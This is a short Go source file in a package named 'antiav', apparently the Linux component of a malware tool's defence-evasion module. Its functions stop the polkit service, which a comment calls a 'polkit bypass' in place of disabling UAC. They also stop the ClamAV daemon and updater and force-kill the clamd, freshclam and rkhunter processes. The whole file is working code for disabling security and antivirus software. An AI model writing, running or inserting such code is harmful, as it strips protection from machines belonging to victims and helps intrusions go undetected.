//go:build linux

package antiav

import (
    "os/exec"
)

func DisableUAC() {
    // Linux: polkit bypass best-effort (no UAC equivalent)
    exec.Command("systemctl", "stop", "polkit").Run()
}

func DisableWDInitiate() {
    // Try to stop ClamAV
    exec.Command("systemctl", "stop", "clamav-daemon").Run()
    exec.Command("systemctl", "stop", "clamav-freshclam").Run()
}

func AvProcs() {
    av := []string{"clamd", "freshclam", "rkhunter"}
    for _, p := range av {
        exec.Command("killall", "-9", p).Run()
    }
}
